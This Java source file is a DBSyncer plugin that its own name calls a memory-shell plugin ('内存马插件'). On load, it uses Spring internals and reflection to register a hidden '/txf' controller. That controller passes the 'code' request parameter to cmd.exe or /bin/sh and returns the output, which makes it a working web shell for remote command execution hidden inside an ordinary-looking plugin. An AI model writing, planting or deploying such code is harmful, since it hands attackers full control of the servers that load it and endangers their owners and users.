package org.test;

import org.dbsyncer.sdk.plugin.PluginContext;
import org.dbsyncer.sdk.spi.PluginService;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.nio.charset.Charset;
import javax.annotation.PostConstruct;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

public class MyPlugin implements PluginService {

    private WebApplicationContext context;
    private RequestMappingHandlerMapping mappingHandlerMapping;
    private Method method;
    private Method method2;

    public MyPlugin() {
    }

    private MyPlugin(String aaa) {
    }

    @PostConstruct
    public void init() {

        context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        try {
            method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("getMappingRegistry");
            method.setAccessible(true);
            method2 = MyPlugin.class.getMethod("test");
        } catch (Exception e) {
            e.printStackTrace();
        }
        registerController();
    }

    private void registerController() {
        PatternsRequestCondition url = new PatternsRequestCondition("/txf");
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        MyPlugin injectToController = new MyPlugin("aaa");
        mappingHandlerMapping.registerMapping(info, injectToController, method2);
    }

    public void test() {
        HttpServletRequest request = ((ServletRequestAttributes)(RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes)(RequestContextHolder.currentRequestAttributes())).getResponse();
        String code = request.getParameter("code");
        if(code != null){
            StringBuilder result = new StringBuilder();
            Process process = null;
            BufferedReader bufrIn = null;
            BufferedReader bufrError = null;
            response.setCharacterEncoding("utf-8");
            response.setContentType("text/html,charset=utf-8");
            PrintWriter writer = null;
            try {
                writer = response.getWriter();
            } catch (IOException e) {
                System.out.println(new RuntimeException(e));
            }
            try {
                ProcessBuilder builder = null;
                if (System.getProperty("os.name").toLowerCase().contains("win")){
                    builder = new ProcessBuilder(new String[]{"cmd.exe","/c",code});
                    Process start = builder.start();
                    bufrIn = new BufferedReader(new InputStreamReader(start.getInputStream(), Charset.forName("GBK")));
                    bufrError = new BufferedReader(new InputStreamReader(start.getInputStream(),Charset.forName("GBK")));
                }else {
                    builder = new ProcessBuilder(new String[]{"/bin/sh","-c",code});
                    Process start = builder.start();
                    bufrIn = new BufferedReader(new InputStreamReader(start.getInputStream(), Charset.forName("UTF-8")));
                    bufrError = new BufferedReader(new InputStreamReader(start.getInputStream(),Charset.forName("UTF-8")));
                }
                String line;
                while ((line = bufrIn.readLine()) != null){
                    result.append(line).append('\n').append("</p >");
                }
                while ((line = bufrError.readLine()) != null){
                    result.append(line).append('\n').append("</p >");
                }
                System.out.println(result);
                writer.println(result);
                writer.flush();
                writer.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void convert(PluginContext pluginContext) {
    }

    @Override
    public void postProcessAfter(PluginContext context) {
    }

    @Override
    public String getVersion() {
        return "1.0.0";
    }

    @Override
    public String getName() {
        return "内存马插件";
    }
}